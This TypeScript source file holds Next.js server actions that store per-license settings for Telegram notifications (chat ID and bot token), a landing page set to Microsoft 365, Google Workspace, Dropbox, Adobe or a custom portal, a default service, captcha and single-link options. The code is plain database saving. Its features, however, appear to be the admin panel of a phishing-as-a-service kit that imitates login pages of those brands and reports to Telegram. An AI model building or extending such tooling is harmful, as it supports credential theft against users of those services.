"use server";

import { revalidatePath } from "next/cache";
import { z } from "zod";
import { db } from "@/lib/db";
import { requireSession } from "@/lib/auth";
import {
  captchaSettings,
  defaultServices,
  landingPages,
  singleLinkSettings,
  telegramNotifications,
} from "@/lib/schema/main.schema";

export type ActionState = { error?: string; success?: string };

const services = ["Microsoft 365", "Google Workspace", "Custom Portal", "Dropbox", "Adobe"] as const;
const options = ["enabled", "disabled"] as const;

export async function saveTelegram(_state: ActionState, formData: FormData): Promise<ActionState> {
  const session = await requireSession();
  const schema = z.object({
    chatId: z.string().trim().min(2, "Chat ID is required."),
    botToken: z.string().trim().min(8, "Bot token is required."),
  });
  const parsed = schema.safeParse({
    chatId: formData.get("chatId"),
    botToken: formData.get("botToken"),
  });
  if (!parsed.success) return { error: parsed.error.issues[0]?.message ?? "Invalid Telegram settings." };

  await db
    .insert(telegramNotifications)
    .values({ licenseId: session.licenseId, ...parsed.data, updatedAt: new Date().toISOString() })
    .onConflictDoUpdate({
      target: telegramNotifications.licenseId,
      set: { ...parsed.data, updatedAt: new Date().toISOString() },
    });
  revalidatePath("/link-management/telegram-notification");
  return { success: "Telegram notification saved." };
}

export async function saveLandingPage(_state: ActionState, formData: FormData): Promise<ActionState> {
  const session = await requireSession();
  const parsed = z
    .object({ service: z.enum(services), domainId: z.coerce.number().int().positive() })
    .safeParse({ service: formData.get("service"), domainId: formData.get("domainId") });
  if (!parsed.success) return { error: parsed.error.issues[0]?.message ?? "Choose a service and domain." };

  await db
    .insert(landingPages)
    .values({ licenseId: session.licenseId, ...parsed.data, updatedAt: new Date().toISOString() })
    .onConflictDoUpdate({
      target: landingPages.licenseId,
      set: { ...parsed.data, updatedAt: new Date().toISOString() },
    });
  revalidatePath("/link-management/landing-page");
  return { success: "Landing page saved." };
}

export async function saveDefaultService(_state: ActionState, formData: FormData): Promise<ActionState> {
  const session = await requireSession();
  const parsed = z.object({ service: z.enum(services) }).safeParse({ service: formData.get("service") });
  if (!parsed.success) return { error: "Select a service." };
  await db
    .insert(defaultServices)
    .values({ licenseId: session.licenseId, ...parsed.data, updatedAt: new Date().toISOString() })
    .onConflictDoUpdate({
      target: defaultServices.licenseId,
      set: { ...parsed.data, updatedAt: new Date().toISOString() },
    });
  revalidatePath("/link-management/default-service");
  return { success: "Default service saved." };
}

export async function saveSingleLink(_state: ActionState, formData: FormData): Promise<ActionState> {
  return saveOption(singleLinkSettings, "single-link", formData);
}

export async function saveCaptcha(_state: ActionState, formData: FormData): Promise<ActionState> {
  return saveOption(captchaSettings, "captcha", formData);
}

async function saveOption(
  table: typeof singleLinkSettings | typeof captchaSettings,
  path: string,
  formData: FormData,
): Promise<ActionState> {
  const session = await requireSession();
  const parsed = z.object({ option: z.enum(options) }).safeParse({ option: formData.get("option") });
  if (!parsed.success) return { error: "Select an option." };
  await db
    .insert(table)
    .values({ licenseId: session.licenseId, ...parsed.data, updatedAt: new Date().toISOString() })
    .onConflictDoUpdate({
      target: table.licenseId,
      set: { ...parsed.data, updatedAt: new Date().toISOString() },
    });
  revalidatePath(`/link-management/${path}`);
  return { success: "Setting saved." };
}
